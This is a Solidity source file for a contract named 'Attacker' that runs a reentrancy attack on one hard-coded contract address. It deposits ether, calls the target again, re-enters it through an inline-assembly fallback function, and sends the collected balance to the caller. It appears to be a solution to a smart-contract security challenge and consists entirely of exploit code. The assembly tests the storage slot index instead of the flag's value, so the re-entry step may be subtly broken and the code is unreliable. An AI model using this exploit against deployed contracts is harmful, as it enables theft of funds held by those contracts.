pragma solidity ^0.5.0;


contract Attacker {
    address payable constant public token = 0x07d67Cb7736c9812277f6d1921fa872bff9Ea160;
    uint flag;
    
    function attack() public payable {
        require(msg.value > 0);

        (bool ret1,) = token.call.value(msg.value)("");
        require(ret1);
        
        flag = 0;
        flag = 1;
        (bool ret2,) = token.call.value(0)("");
        require(ret2);
        
        msg.sender.transfer(address(this).balance);
    }
    
    function () external payable {
        assembly {
            if eq(flag_slot, 1) {
                sstore(flag_slot, 2)
                let r := call(gas, 0x07d67Cb7736c9812277f6d1921fa872bff9Ea160, 0, 0, 0, 0, 0)
            }
        }
        // if (flag == 1) {
        //     flag = 2;
        //     token.call.value(0)("");
        // }
    }
}